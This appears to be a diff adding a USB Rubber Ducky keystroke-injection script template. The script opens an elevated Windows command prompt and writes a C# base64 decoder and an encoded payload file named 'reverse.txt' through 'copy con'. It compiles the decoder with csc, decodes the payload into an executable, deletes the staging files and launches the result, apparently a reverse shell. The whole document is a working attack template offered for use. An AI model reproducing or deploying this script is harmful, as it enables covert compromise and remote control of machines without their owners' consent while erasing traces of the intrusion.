@@ -1,0 +1,44 @@
+DELAY 4000
+ESCAPE
+CONTROL ESCAPE
+DELAY 400
+STRING cmd
+DELAY 2000
+APP
+DELAY 400
+STRING a
+DELAY 600
+LEFTARROW
+ENTER
+DELAY 400
+STRING copy con c:\base64toexe.cs
+ENTER
+{0}
+CTRL z
+ENTER
+STRING copy con c:\reverse.txt
+ENTER
+{1}
+CTRL z
+ENTER
+STRING cd /Windows/Microsoft.NET/Framework/
+ENTER
+STRING cd v2
+TAB
+ENTER
+STRING csc /out:C:/Base64ToExe.exe "C:\base64toexe.cs"
+ENTER
+STRING cd c:/
+ENTER
+STRING base64toexe reverse.txt {2}
+ENTER
+STRING del reverse.txt
+ENTER
+STRING del base64toexe.cs
+ENTER
+STRING del Base64ToExe.exe
+ENTER
+STRING start c:\{2} {3}
+ENTER
+STRING EXIT
+ENTER
